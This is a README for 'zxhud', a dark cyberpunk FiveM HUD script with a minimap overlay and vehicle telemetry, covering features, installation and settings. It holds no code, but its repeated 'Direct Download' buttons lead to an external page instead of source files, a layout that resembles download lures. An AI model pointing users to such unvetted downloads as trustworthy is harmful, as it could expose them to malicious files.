# zxhud - FiveM HUD v1.0 - Cyberpunk Game Interface 2026

> **A custom FiveM HUD featuring a dark cyberpunk aesthetic with teal and gold accents, including a minimap overlay, camera status indicator, and comprehensive vehicle telemetry displays.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathan-ward73/zxhud-script-hub?style=flat-square)](https://github.com/nathan-ward73/zxhud-script-hub)

---

<p align="center">
  <a href="https://nathan-ward73.github.io/zxhud-script-hub/">
    <img src="https://img.shields.io/badge/Download-zxhud%20Script-brightgreen?style=for-the-badge" alt="Download zxhud Script">
  </a>
</p>

> **[Direct Download - zxhud](https://nathan-ward73.github.io/zxhud-script-hub/)**

---

[Download Latest Build](https://nathan-ward73.github.io/zxhud-script-hub/)

---

## About

zxhud delivers a fully customized heads-up display for FiveM, built around a dark cyberpunk theme. The interface pairs a custom minimap overlay with live vehicle telemetry that shows gear position, speed, fuel level, and engine status. Gold and teal accent colors create a futuristic look while preserving readability during gameplay.

This script focuses on giving drivers and navigators quick access to essential information. A camera status indicator and zone ability display help you stay aware of your surroundings, while smooth CSS animations and glassmorphism panels produce a polished visual experience. Regular updates maintain compatibility with current FiveM builds, and community feedback drives ongoing improvements.

---

## Key Features

- Dark cyberpunk theme with gold accent color scheme for an immersive visual style
- Custom minimap overlay that integrates smoothly with the FiveM interface
- Camera status indicator showing current camera mode and state
- Camera zone ability display for better situational awareness
- Gear, speed, fuel, and engine status telemetry panels
- Smooth CSS animations across all interface elements
- Glassmorphism panel effects for modern UI depth and transparency
- Teal accent highlights that complement the primary gold theme

---

## Installation

1. Download the latest zxhud build from the link above.
2. Extract the contents into your FiveM resources folder (`resources/[local]/zxhud/`).
3. Add `ensure zxhud` to your server configuration file (`server.cfg`).
4. Restart your FiveM server or use the `refresh` command followed by `start zxhud`.

No additional dependencies or configuration files are needed for basic operation.

---

## Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| minimap_enabled | true | Toggle custom minimap overlay visibility |
| camera_indicator | true | Enable camera status display |
| vehicle_telemetry | true | Show gear, speed, fuel, and engine data |
| animation_speed | 300ms | Adjust CSS animation transition duration |
| accent_color | #ffd700 | Change gold accent to custom hex color |

To modify settings, edit the `config.lua` file within the script folder.

---

## Compatibility

- FiveM server platform (Windows and Linux)
- Tested with FiveM builds from 2025 onward
- Compatible with most popular FiveM frameworks and vehicle scripts
- Known limitation: Custom minimap may conflict with other HUD mods using overlay systems
- Vehicle telemetry requires supported vehicle entities; some custom vehicles may not display all data

---

## Frequently Asked Questions

**How do I install zxhud on my FiveM server?**  
Place the script folder in your resources directory, add `ensure zxhud` to server.cfg, then restart or start the resource.

**Will updates overwrite my custom settings?**  
Configuration changes are stored in the config file and should persist across updates unless explicitly noted in the changelog.

**Can I modify the theme colors?**  
Yes, the accent color and other visual settings can be adjusted in the configuration file.

**Does this work with other HUD scripts?**  
The custom minimap overlay may conflict with other HUD modifications. Disable other minimap scripts for best results.

**Where is vehicle data stored?**  
All telemetry data is read from the game client and displayed in real-time; no data is saved or transmitted.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
